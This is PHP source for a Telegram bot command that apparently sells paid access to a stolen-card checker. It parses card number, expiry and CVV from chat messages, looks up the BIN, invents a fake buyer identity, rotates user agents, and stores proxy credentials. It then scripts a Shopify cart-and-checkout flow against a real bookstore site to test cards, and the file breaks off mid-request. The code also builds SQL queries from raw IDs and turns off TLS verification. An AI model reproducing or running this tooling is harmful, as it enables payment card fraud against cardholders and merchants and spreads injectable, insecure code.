<?php
list($cmd) = explode(" ", $text);
if($cmd == "/sb" or $cmd == ".sb" or $cmd == "!sb" or $cmd == "?sb" or $cmd == "#sb" or $cmd == ":sb" or $cmd == ",sb"){ 


    if($cmd == '/sb'){
        $gatecmd = "sb";
    }elseif($cmd == ".sb"){
        $gatecmd = "sb";
    }elseif($cmd == "!sb"){
        $gatecmd = "sb";
    }elseif($cmd == "?sb"){
        $gatecmd = "sb";
    }elseif($cmd == "#sb"){
        $gatecmd = "sb";
    }elseif($cmd == ":sb"){
        $gatecmd = "sb";
    }elseif($cmd == ",sb"){
        $gatecmd = "sb";
    }
    
    $lista = explode(" ", $text)[1];
    $sql = "SELECT planexpiry FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("testt.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $planexpiry = anicap($final2, '"planexpiry":"','"');
    mysqli_close(mysqlcon());
    
    $sql = "SELECT gatecmd FROM gateway WHERE gatecmd='$gatecmd'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("testt.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $gatec = anicap($final2, '"gatecmd":"','"');
    mysqli_close(mysqlcon());
    
    $sql = "SELECT plan FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    $plan = anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    $sql = "SELECT status FROM gateway WHERE gatecmd='sb'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("testt.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $status = anicap($final2, '"status":"','"');
    mysqli_close(mysqlcon());
    if($status == "OFF"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ ", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }
    $sql = "SELECT creditos FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("test.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $credits = anicap($final2, '"creditos":"','"');
    mysqli_close(mysqlcon());
    $now = time();
    if($gatec != $gatecmd){
        $content = ['chat_id' => $chat_id, 'text' => "<b>Gate not added, 𝑷𝒍𝒆𝒂𝒔𝒆 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk </b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
      if ($planexpiry < $now && $planexpiry == 0) {
    }

elseif ($planexpiry < $now && $plan != "Free User") {
    
    // Check connection
    // Attempt create database query execution
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "<b>𝒀𝒐𝒖𝒓 𝒔𝒖𝒃𝒔𝒄𝒓𝒊𝒑𝒕𝒊𝒐𝒏 𝒑𝒍𝒂𝒏 𝒊𝒔 𝒆𝒙𝒑𝒊𝒓𝒆𝒅, 𝑷𝒍𝒆𝒂𝒔𝒆 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk 𝒕𝒐 𝒓𝒆𝒏𝒆𝒘</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    $SQL = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $chats =anicap($final2, '"chats":"','"');
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔𝒏'𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆, 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{
        
       
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $plan =anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆 𝒊𝒏 𝒑𝒓𝒊𝒗𝒂𝒕𝒆 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
        if($plan == "Free User"){
        $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    else{}
    if($credits <= 0 or $credits == 1){
        $content = ['chat_id' => $chat_id, 'text' => "You have no credits to check xd", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }

    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒂 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    } else {
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $text, $matches);
    if (count($matches[0]) == 3) {
        $cc = $matches[0][0];
        $mes = substr($matches[0][1], 0, 2);
        $ano = substr($matches[0][1], -2);
        $cvv = $matches[0][2];
    } else if (strlen($matches[0][1]) == 3) {
        $cc = $matches[0][0];
        $ano1 = $matches[0][2];
        $ano = $matches[0][3];
        $cvv = $matches[0][1];
        $mes = $ano1;
    } else {
        $cc = $matches[0][0];
        $mes = $matches[0][1];
        $ano = $matches[0][2];
        $cvv = $matches[0][3];
    }
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);
    if($first1 == "4"){
        $cc_type = "5963a708-fc7f-48af-952f-16d574c4b833";
    }
    if($first1 == "5"){
        $cc_type = "b34832f7-8a95-47fa-9c43-bc8682562ea5";
    }
    if($first1 == "3"){
        $cc_type = "c4a56513-9fdb-44c5-9b19-e617f2596107";
    }
    if($mes == "01"){
        $sub_mes = "1";
    }elseif($mes == "02"){
        $sub_mes = "2";
    }elseif($mes == "03"){
        $sub_mes = "3";
    }elseif($mes == "04"){
        $sub_mes = "4";
    }elseif($mes == "05"){
        $sub_mes = "5";
    }elseif($mes == "06"){
        $sub_mes = "6";
    }elseif($mes == "07"){
        $sub_mes = "7";
    }elseif($mes == "08"){
        $sub_mes = "8";
    }elseif($mes == "09"){
        $sub_mes = "9";
    }elseif($mes == "10"){
        $sub_mes = "10";
    }elseif($mes == "11"){
        $sub_mes = "11";
    }elseif($mes == "12"){
        $sub_mes = "12";
    }
    $cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, -8);
$cc3 = substr($cc, 8, -4);
$cc4 = substr($cc, -4);

    //        'ihojryep-rotate:a75v25f6afx1',
    //"psyohwld-rotate:hdxu4zfaz5ip",
    $rotate = array(
        'U99pbU:yM0wAf',
        'oCqNRH:i18i58',
        'PfO6EN:3j04W4',
        'oXGn5O:E3lj3G',
        'lr9wwO:x33pVi',
        '2jCHw9:KzDDgy',
        'UbFFce:3Ftrj2',
        'K5VKJa:8zdAZT',
        'f951hv:k0YRer',
        '1pYsMR:TonSB4',
        'A7t28n:XEDwsb',

        );
        
        $user_pass = $rotate[array_rand($rotate)];
    //         "AUTH"   => "unoehbda-rotate:2bxs8q2xfbks"
    $server = [
        "METHOD" => "CUSTOM",
        "SERVER" => "p.webshare.io:80",


        "AUTH"   => "rteavycr-rotate:f9o3l1ryizdq"
    ];
    

        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        $time = 30;
        $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < 30)
        {
            $TotalTime = $time - $TIMEAC;
            if($plan !== "Free User"){

            }elseif($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 : <code><i>$TotalTime</i></code>s\n══════════════════════</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }
        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
        $timest = time();
        $SQL = "UPDATE ADMINISTRAR SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
if($plan !="Free User"){
        $d = 2;
        $crm = $credits -$d;
        $SQL = "UPDATE `administrar` SET `creditos`='$crm' WHERE `id` = '$user_id'";

mysqli_query(mysqlcon(), $SQL);}
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕...</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];
        

        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■□□□□</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
        $m2  = EditMessageText($content);
        $m2i = $m2['result']['message_id'];

        /*----------  R2 CAPTCHA  ----------*/
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■□□</b>", 'message_id' => $m2i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
        $m3i = $m3['result']['message_id'];
        $useragents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36", "Mozilla/5.0 (X11; CrOS x86_64 9901.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.97 Safari/537.36"];
        $uas = $useragents[array_rand($useragents)];
#-------------------- Bin -------------#
$cctwo = substr("$cc", 0, 6);
$curl = curl_init();
curl_setopt_array($curl, [
CURLOPT_URL => "https://bins-su-ani.vercel.app/api/".$bin,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_ENCODING => "",
CURLOPT_MAXREDIRS => 10,
CURLOPT_TIMEOUT => 30,
CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
CURLOPT_CUSTOMREQUEST => "GET",
CURLOPT_HTTPHEADER => [
"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
"sec-fetch-dest: document",
"sec-fetch-site: none",
"user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
],
]);

$result = curl_exec($curl);
curl_close($curl);
$data = json_decode($result, true);
$bank = $data['data']['bank'];
$country = $data['data']['country'];
$brand = $data['data']['vendor'];
$level = $data['data']['level'];
$type = $data['data']['type'];
$flag = $data['data']['countryInfo']['emoji'];
$result1 = $data['result'];


# ------------ Ramdom User ------------ #

$name = ucfirst(str_shuffle('anibhai'));
$last = ucfirst(str_shuffle('pemro'));
$email = "Dabilol".substr(md5(uniqid()), 0, 8)."@gmail.com";
$street = "".rand(0000,9999)." Main Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY"){
$state = "New York";
$zip = "10080";
$city = "New York";
}
elseif ($statee == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($statee == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($statee == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange Park";
}else{
$state = "California";
$zip = "90201";
$city = "Bell";
};

#--------;---------- R1 SHOPIFY ------------#
$$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.owlcrate.com/products/zodiac-adventure-button-pin?variant=39728207855791');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
//$headers[] = 'GET /products/zodiac-adventure-button-pin?variant=39728207855791 h2';
$headers[] = 'Host: www.owlcrate.com';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: none';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.owlcrate.com/cart/add.js');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /cart/add.js h2';
$headers[] = 'Host: www.owlcrate.com';
#$headers[] = 'content-length: 67';
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'content-type: application/json;charset=UTF-8';
$headers[] = 'sec-gpc: 1';
$headers[] = 'origin: https://www.owlcrate.com';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.owlcrate.com/products/zodiac-adventure-button-pin?variant=39728207855791';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"quantity":1,"id":39728207855791,"properties":{"cart_limit":null}}');
$curl = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.owlcrate.com/cart.js');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'GET /cart.js h2';
$headers[] = 'Host: www.owlcrate.com';
$headers[] = 'pragma: no-cache';
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'cache-control: no-store';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.owlcrate.com/products/zodiac-adventure-button-pin?variant=39728207855791';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.owlcrate.com/cart');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'GET /cart h2';
$headers[] = 'Host: www.owlcrate.com';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://www.owlcrate.com/products/zodiac-adventure-button-pin?variant=39728207855791';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.owlcrate.com/cart');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /cart h2';
$headers[] = 'Host: www.owlcrate.com';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'origin: https://www.owlcrate.com';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://www.owlcrate.com/cart';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'updates%5B%5D=1&checkout=Checkout');
$curl = curl_exec($ch);
$shit = curl_getinfo($ch,CURLINFO_EFFECTIVE_URL );
#$key1   = Anicap($shit,'https://www.owlcrate.com/','/checkouts/');
#$key2   = Anicap($shit,'/checkouts/','&nbsp;');
$token  = Anicap($curl,'input type="hidden" name="authenticity_token" value="','"');
#echo "Url: $shit <br><hr>";
#echo "key2: $key2 <br><hr>";
#echo "authenticity_token: $token <br><hr>";
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$shit.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
//$headers[] = 'GET /10918372/checkouts/c9a9326173841b206ace18cef7786228 h2';
$headers[] = 'Host: www.owlcrate.com';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'sec-gpc: 1';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://www.owlcrate.com/cart';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$shit.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
//$headers[] = 'POST /10918372/checkouts/c9a9326173841b206ace18cef7786228 h2';
$headers[] = 'Host: www.owlcrate.com';
//$headers[] = 'content-length: 1614';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'origin: https://www.owlcrate.com';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'user-agent: '.$uas.'';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
